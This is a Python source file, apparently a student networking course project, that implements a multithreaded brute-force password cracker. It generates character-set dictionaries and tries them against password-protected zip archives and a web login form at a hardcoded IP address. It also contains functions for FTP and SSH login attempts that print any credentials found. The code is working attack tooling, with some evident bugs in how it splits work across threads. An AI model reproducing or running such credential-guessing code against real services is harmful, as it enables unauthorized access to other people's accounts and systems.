#!/usr/bin/python3
# -*- coding: utf-8 -*-
# @Time    : 2019/3/6 14:35
# @Author  : ylh
# @FileName: 计网课设优化版.py
# @Software: PyCharm
##三个函数，zip爆破，post爆破，ftp爆破，字典生成函数，显示进度函数
import zipfile
import string
import itertools as its
import requests
import re
import threading
import multiprocessing
event = multiprocessing.Event()
def xuanze():##用户选择模式和爆破方式{自己添加字典待定}
    print('usage:\n1.zip爆破\n2.post密码爆破\n3.ftp密码爆破\n爆破字典选择：0~9：①'+'  '+'A~Z：②'+'  '+'a~z：③'+'  '+'mostAscii(printable)：④'+'\n')
    p = input('please input file path:\n')
    a = input('please choose attack number:\n')
    b = input('please choose digit number:\n')
    c,d = input('请选择爆破位数c和d:\n').split()
    t = input('number of thread:\n')
    return a,b,c,d,p,t
def digit_number(b,c,d):
    arr1 = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
    arr2 = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U',
            'V', 'W', 'X', 'Y', 'Z']
    arr3 = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u',
            'v', 'w', 'x', 'y', 'z']
    arr4 = [' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4',
            '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I',
            'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^',
            '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's',
            't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~']
    chose = b
    t = ''
    if chose =='1':
        for i in arr1:
            t = t + str(i)
    elif chose =='2':
        for i in arr2:
            t = t + str(i)
    elif chose == '3':
        for i in arr3:
            t = t + str(i)
    elif chose =='12' or chose =='21' or chose =='1 2'or chose =='2 1':
        for i in arr1:
            t = t + str(i)
        for i in arr2:
            t = t + str(i)
    elif chose == '123'or chose =='321' or chose =='1 2 3'or chose =='3 2 1'or chose =='132'or chose=='213'or chose =='231'or chose=='312':
        for i in arr1:
            t = t + str(i)
        for i in arr2:
            t = t + str(i)
        for i in arr3:
            t = t + str(i)
    elif chose == '23'or chose =='32' or chose =='2 3'or chose =='3 2':
        for i in arr2:
            t = t + str(i)
        for i in arr3:
            t = t + str(i)
    elif chose == '13'or chose =='31' or chose =='1 3'or chose =='3 1':
        for i in arr1:
            t = t + str(i)
        for i in arr3:
            t = t + str(i)
    elif chose == '4':
        for i in arr4:
            t = t + str(i)
    print('字典素材选择成功:%s'%t)
    strings = ''
    for i in range(int(str(c)), int(str(d)) + 1):
        r = its.product(t,repeat=i)
        for j in r:
            strings =strings +''.join(j)+'\n'
    open(r'./dictionary.txt','w').write(strings)
    ###只能容纳系统内存大小的数组，，否则会内存溢出报错
    ##最好还是写入log文件中，然后分列数读取
    print('digitnumber made success!')
    # return strings
def fast_dic(b,c,d):
    s = ''
    for i in b:
        for j in range(int(c),int(d)+1):
            r = open(r'./dic/'+str(i)+'_'+str(j)+'.txt').readlines()
            for z in r:
                s = s + z
    print('dic made success!')
    return s
def zip_crack(strings,p):
    # print('zip爆破开始:\n')
    f = zipfile.ZipFile(p,'r')
    event.set()
    # a = open(strings).readlines()
    # l = len(a)
    while event.is_set():
        for i in strings:
            try:
                f.extractall(pwd=i.strip().encode('utf8'))
                print('   find pwd: %s'%i.strip())
                event.clear()
                return 0
            except:
                pass
def post_crack(strings):
    s = requests.session()
    url = "http://123.206.87.240:8002/baopo/?yes"
    # print('post密码爆破开始；\n')
    event.set()
    while event.is_set():
        try:
            for i in strings:
                print('pwd:%s'%i)
                form_data = {'pwd': int(i)}
                a = s.post(url=url, data=form_data)
                # print(a.content.decode('utf8'))
                if len(a.content.decode('utf8')) < 300:
                    # print()
                    print('find%s'%i, end='  ')
                    print(a.content.decode('utf8'))
                    event.clear()
                    return 0
        except:
            pass
def ftp_crack(host,username,password):
    import ftplib
    from ftplib import FTP
    ftp = FTP()
    try:
        ftp.connect(host, 21, 1)
        ftp.login(username, password)
        ftp.retrlines('LIST')
        ftp.quit()
        print('破解成功,用户名：' + username + '，密码：' + password + ',IP:' + host)
        return True
    except ftplib.all_errors:
        pass
def ssh_crack(host,user,pwd):
    import paramiko
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname=host, username=user, password=pwd, timeout=5)
        ssh.close()
        print('破解成功！用户名：' + user + '，密码：' + pwd + ',主机IP:' + host)
    except:
        pass

def duoxiancheng(p,strings,a,t):
    # n = input('input the number of threads:\n')
    n =t
    if a == '1':
        for i in range(int(n)):
            x = strings[int(i*len(strings)/int(n)):int(2*i*len(strings)/int(n))]
            th = threading.Thread(target=zip_crack,args=(x,p))
            th.start()
    if a == '2':
        for i in range(int(n)):
            x = strings[int(i*len(strings)/int(n)):int(2*i*len(strings)/int(n))]
            th = threading.Thread(target=post_crack,args=(x,))
            th.start()
def duojincheng(p,strings,a,t):
    import multiprocessing
    n = t
    s = []
    for i in strings.split():
        s.append(i)
    strings = s
    if a =='1':
        for i in range(int(n)):
            x = strings[int(i*len(strings)/int(n)):int(i*len(strings)/int(n))+int(len(strings)/int(n))]
            pr = multiprocessing.Process(target=zip_crack,args=(x,p))
            pr.start()
    if a == '2':
        for i in range(int(n)):
            x = strings[int(i*len(strings)/int(n)):int(2*i*len(strings)/int(n))]
            pr = multiprocessing.Process(target=post_crack, args=(x,))
            pr.start()
def main():
    a,b,c,d,p,t=xuanze()
    # digit_number(b,c,d)
    # strings = open('./dictionary.txt').readlines()
    strings= fast_dic(b,c,d)
    # duoxiancheng(p,strings,a,t)
    duojincheng(p,strings,a,t)
if __name__ == '__main__':
    main()
